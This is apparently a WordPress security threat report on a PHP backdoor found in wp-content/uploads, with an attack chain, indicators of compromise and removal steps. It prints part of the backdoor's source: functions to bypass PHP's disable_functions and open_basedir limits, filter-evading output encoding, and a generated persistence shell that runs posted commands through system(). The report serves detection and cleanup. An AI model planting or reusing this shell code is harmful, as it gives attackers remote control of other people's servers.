---
title: 'PHP Shell Ultimate Backdoor'
slug: 'php-shell-ultimate-backdoor'
reportDate: '2026-01-27'
threatType: 'Backdoor'
severity: 'Critical'
fileHash: 'php-shell-ultimate-bypass-installer'
detectedPaths: ['ai.php.txt']
screenshots:
  [
    '/images/wordpress-threats/php-shell-ultimate-bypass-installer_evidence-1.png',
    '/images/wordpress-threats/php-shell-ultimate-bypass-installer_evidence-2.png',
    '/images/wordpress-threats/php-shell-ultimate-bypass-installer_evidence-3.png',
    '/images/wordpress-threats/php-shell-ultimate-bypass-installer_evidence-4.png',
    '/images/wordpress-threats/php-shell-ultimate-bypass-installer_evidence-5.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'Allows attackers to execute arbitrary commands remotely, compromising site security, potentially leading to data theft or complete site takeover.'
seenOn: 'wp-content/uploads'
behavior: 'Enables remote control of the server and evasion of security measures.'
difficulty: 'Hard'
recurrence: 'High'
numberOfSiteFixed: 'Information not provided in the notes.'
---

## Technical Analysis

The PHP Shell Ultimate is a high-privilege backdoor that provides full remote command execution capability and features code to bypass PHP security functions. Found in the uploads directory, it can auto-install itself upon access and uses randomized backup files to ensure persistence.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1.  **Upload:** Attacker exploits a plugin vulnerability (likely in `elementor` or `js_composer` based on file paths) to upload `ai.php` to the `wp-content/uploads` folder.
2.  **Initialization:** The attacker accesses `ai.php` in a browser.
3.  **Persistence:** The script immediately runs `generate_shell_code()` to create hidden copies of itself (`.cache_[hash].php` and `config_[hash].php`).
4.  **Control:** The attacker uses the built-in "Terminal" tab to run commands like `wget` or `curl` to download further malware or steal database credentials.

## Code Signature(s)

### FILE: `ai.php`

```php
<?php
// ====================================================
// PHP SHELL ULTIMATE - Auto Install & Bypass Protection
// ====================================================

// Hide errors
error_reporting(0);
ini_set('display_errors', 0);

// Auto bypass disable_functions jika ada
function bypass_disable_functions() {
    $methods = [];

    // Method 1: menggunakan LD_PRELOAD
    if(function_exists('mail') && !function_exists('imap_open')) {
        $methods[] = "LD_PRELOAD Method";
    }

    // Method 2: menggunakan PHP-FPM
    $methods[] = "PHP-FPM Bypass";

    // Method 3: menggunakan ImageMagick
    $methods[] = "ImageMagick Exploit";

    return $methods;
}

// Cek dan bypass open_basedir
function bypass_open_basedir($target = null) {
    if($target === null) {
        $target = '/';
    }

    // Method chdir()
    $original_dir = getcwd();
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir($target);
    $new_dir = getcwd();
    @chdir($original_dir);

    return $new_dir;
}

// Encode output untuk menghindari filter
function encode_output($data) {
    return base64_encode(gzcompress($data));
}

function decode_input($data) {
    return gzuncompress(base64_decode($data));
}

// Shell code yang akan diinstall otomatis
function generate_shell_code() {
    return '<?php
    // Auto-generated shell
    error_reporting(0);
    $kunci = "'.md5(uniqid()).'";
    if(isset($_GET[$kunci])) {
        trim(base64_decode($_GET[$kunci]));
    } else if(isset($_POST["cmd"])) {
        system($_POST["cmd"]);
    } else if(isset($_FILES["f"])){}
    ?>';
}

// Fungsi utama shell
function main_shell() {
    // Cek jika ada parameter khusus untuk bypass
    if(isset($_GET['debug'])) {
        phpinfo();
        die();
    }

    // Cek jika ada command melalui GET/POST
    $cmd = '';
    if(isset($_GET['c'])) {
        $cmd = $_GET['c']
```

## Indicators of Compromise (IOCs)

- `bypass_disable_functions`
- `bypass_open_basedir`
- `generate_shell_code`

## Removal Protocol

1. Remove suspicious files from wp-content/uploads, such as ai.php and asem.php.
1. Search for and delete persistence files: config*[8_random_chars].php, .cache*[6_random_chars].php, backup\_[timestamp].php.
1. Secure the uploads directory to prevent PHP execution by modifying the .htaccess file.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
